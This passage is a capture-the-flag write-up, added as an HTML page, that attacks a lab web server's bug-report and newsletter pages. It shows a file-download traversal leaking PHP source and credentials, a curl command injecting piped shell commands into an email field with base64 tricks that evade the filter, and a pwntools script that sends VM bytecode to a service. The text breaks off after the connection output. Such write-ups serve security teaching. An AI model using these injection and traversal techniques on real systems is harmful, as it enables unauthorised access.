@@ -1,0 +1,491 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>writeup</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="tie-breaker">Tie Breaker</h1>
+<blockquote>
+<p>Bad sportsmanship, or good social engineering? - tchilders</p>
+</blockquote>
+<h2 id="challenge-description">Challenge Description</h2>
+<p><code>http://172.18.10.105:6530</code> good luck.</p>
+<h2 id="initial-observations">Initial Observations</h2>
+<p>The initial website has links to two different web pages, <code>/bug_report/</code> and <code>mail.php</code>. bug_report gives some php errors about undefined index user and password. Let’s try adding <code>?user=admin&amp;password=password</code>.</p>
+<h2 id="bug-report">Bug Report</h2>
+<p>Adding the user and password gives us a “Bug Reporting System” Page. There is also a php error about undefined index file. There are three links on this page that all go to the <code>/bug_report/</code> endpoint with different <code>file=</code> parameters.</p>
+<p><code>VM_Capture.pcap</code><br>
+<code>Payload.vm</code><br>
+<code>PayloadDecompiler</code> - We were told later that this link was supposed to be <code>/PayloadDecompiler</code>.</p>
+<p>It looks like this lets us download arbitrary files. Can we get some php source code?</p>
+<p><code>index.php</code></p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_startup_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"../config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$bug_user</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$bug_pass</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You need to login to access this."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Description: File Transfer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Expires: 0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Cache-Control: must-revalidate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Pragma: public'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length:'</span> <span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	exit<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+
+<span class="token doctype">&lt;!DOCTYPE html&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://static.pingendo.com/bootstrap/bootstrap-4.3.1.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>py-5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-12<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>display-3 text-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Secrets R Us - Bug Reporting System<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>py-5<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-12<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> Ticket from XYZ, LLC - User was able to access secrets<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>blockquote mb-0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello Secrets R Us Staff,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>We deployed secrets in one of our VMs and sent it to a client of ours and while using it our client seems to have mis-read the VM documentation because they were able to leak secrets from outside of the VM memory.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Can you take a look at our VM and see what might be wrong I think we're running the latest version, we have attached a pcap of our default payload as well as our test payload.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Attached File: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?file=/VM_Capture.pcap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>VM_Capture.pcap<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Attached File: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?file=/Payload.vm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Payload.vm<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
+              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>blockquote</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card-header bg-warning<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> Admin Response - User was able to access secrets<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card-body bg-info<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span>
+              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lead bg-info<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span>Hello XYZ LLC,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>This shouldn't be possible with our technology we assure you we are looking into this!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>In the mean time can you have your client try this binary to create the payload they send to your VM and see if any issues occur?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Note to Admins: Please decompile the supplied payload using PayloadDecompiler<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Attached File: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?file=PayloadDecompiler<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>PayloadDecompiler<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>py-5 text-center text-white h-100 align-items-center d-flex<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span><span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.75</span><span class="token punctuation">)</span>, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.75</span><span class="token punctuation">)</span><span class="token punctuation">)</span>, <span class="token url">url(&amp;quot;https://static.pingendo.com/cover-bubble-dark.svg&amp;quot;)</span><span class="token punctuation">;</span> <span class="token property">background-position</span><span class="token punctuation">:</span> center center, center center<span class="token punctuation">;</span> <span class="token property">background-size</span><span class="token punctuation">:</span> cover, cover<span class="token punctuation">;</span> <span class="token property">background-repeat</span><span class="token punctuation">:</span> repeat, repeat<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.3.1.slim.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<p>Looks like this page will let us get any file we want from the server. There is a bug in the webpage that means you only need to get the user or password correct.</p>
+<p><code>../config.php</code></p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$bug_user</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
+<span class="token variable">$bug_pass</span> <span class="token operator">=</span> <span class="token string">"b(_)gs"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre>
+<p>These are the debug creds for the bug_report webpage.</p>
+<p><code>../mail.php</code></p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+	<span class="token keyword">echo</span> <span class="token string">"Sending email for news letter signup using mail command&lt;br&gt;"</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Those characters aren't allowed in the email field."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"mail -s \"Welcome to our newsletter\" "</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre>
+<h2 id="email">Email</h2>
+<p>The mail page causes a <code>shell_exec</code> call with the lightly filtered user input. We can avoid the filter by replacing <code>.</code> with <code>$(echo Lg== | base64 -d)</code> and <code>/</code> with <code>echo Lw== | base64 -d</code>. We can inject our own command to the email by adding a <code>|</code> to the end of the email and by echoing the command to get the output. Here’s an example where we can run <code>ls /</code>.</p>
+<pre><code>$curl 'http://172.18.10.105:6530/mail.php' --data-raw 'email="a@a.com" | echo $(ls $(echo Lw== | base64 -d))'
+Sending email for news letter signup using mail command&lt;br&gt;Payload.vm PayloadDecompiler VM_Capture.pcap bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var web-apps web-servers
+</code></pre>
+<p>We can try searching for some obvious flags using <code>find</code> but we won’t fond anything. It seems like this might be a dead end.</p>
+<h2 id="packet-capture">Packet Capture</h2>
+<p>Let’s look at the pcap. It looks like there are a lot of requests to port 1025, some of the requests send some binary data and get back Fibonacci numbers. It will be important to notice that the after the sender is finished sending binary data, they send a FIN which closes their side of the TCP session.</p>
+<h2 id="decompilation">Decompilation</h2>
+<p>Let’s look at the <code>Payload.vm</code> file. It looks like some kind of binary, probably run in some kind of custom VM. We can decompile the binary with the PayloadDecompiler utility and get the following output.</p>
+<pre><code>$ ./PayloadDecompiler Payload.vm 
+; File Payload.vm --- 380 bytes
+0x0 PUSH 0xe0
+0x8 JMP
+0xc NOP
+0x10 PUSH 0x2e ('.')
+0x18 PUSH 0xc
+0x20 STOR
+0x24 POPIP
+0x28 PUSH 0xc
+0x30 LOAD
+0x34 POPIP
+0x38 PUSH 0x1
+0x40 SWAP
+0x44 SUB
+0x48 POPIP
+0x4c DUP
+0x50 PUSH 0xc
+0x58 STOR
+0x5c POPIP
+0x60 PUSHIP 0x74 ('t')
+0x68 PUSH 0x28 ('(')
+0x70 JMP
+0x74 PUSHIP 0x88
+0x7c PUSH 0x38 ('8')
+0x84 JMP
+0x88 PUSHIP 0x9c
+0x90 PUSH 0x4c ('L')
+0x98 JMP
+0x9c POPIP
+0xa0 DUP
+0xa4 OUTNUM
+0xa8 PUSH 0xa ('\n')
+0xb0 OUT
+0xb4 POPIP
+0xb8 SWAP
+0xbc DUP
+0xc0 ROL3
+0xc4 DUP
+0xc8 ROL3
+0xcc SWAP
+0xd0 POPIP
+0xd4 SWAP
+0xd8 JNZ
+0xdc POPIP
+0xe0 PUSHIP 0xf4
+0xe8 PUSH 0x10
+0xf0 JMP
+0xf4 PUSH 0x0
+0xfc PUSHIP 0x110
+0x104 PUSH 0xa0
+0x10c JMP
+0x110 PUSH 0x1
+0x118 PUSHIP 0x12c
+0x120 PUSH 0xb8
+0x128 JMP
+0x12c ADD
+0x130 PUSHIP 0x144
+0x138 PUSH 0xa0
+0x140 JMP
+0x144 PUSHIP 0x158
+0x14c PUSH 0x60 ('`')
+0x154 JMP
+0x158 PUSH 0x118
+0x160 PUSHIP 0x174
+0x168 PUSH 0xd4
+0x170 JMP
+0x174 PUSH 0x17c
+0x17c JMP
+</code></pre>
+<p>Some of the assembly stands out, <code>puship</code> and <code>popip</code> specifically. One of the first few hits on Google is <code>https://github.com/cslarsen/stack-machine</code> which looks promising. One of the example codes even outputs Fibonacci numbers. After cloning the repo we can use <code>make all check</code> to build the binaries and the example code. If we compare <code>stack-machine/tests/fib.sm</code> to the data sent in the pcap we will see that it is identical. It is also identical to the data in <code>Payload.vm</code>. Now let’s try to get the code running on the server.</p>
+<p>We can use pwntools to start a TCP session with the server on 1025. Then we need to send the binary and close the send part of the session with the <code>shutdown('send')</code> function.</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"Payload.vm"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+con <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.18.10.105'</span><span class="token punctuation">,</span> <span class="token number">1025</span><span class="token punctuation">)</span>
+con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+con<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token string">'send'</span><span class="token punctuation">)</span>
+out<span class="token operator">=</span>con<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<pre><code>$ python3.8 send.py
+[+] Opening connection to 172.18.10.105 on port 1025: Done
+[+] Receiving all data: Done (395B)
+[*] Closed connection to 172.18.10.105 port 1025
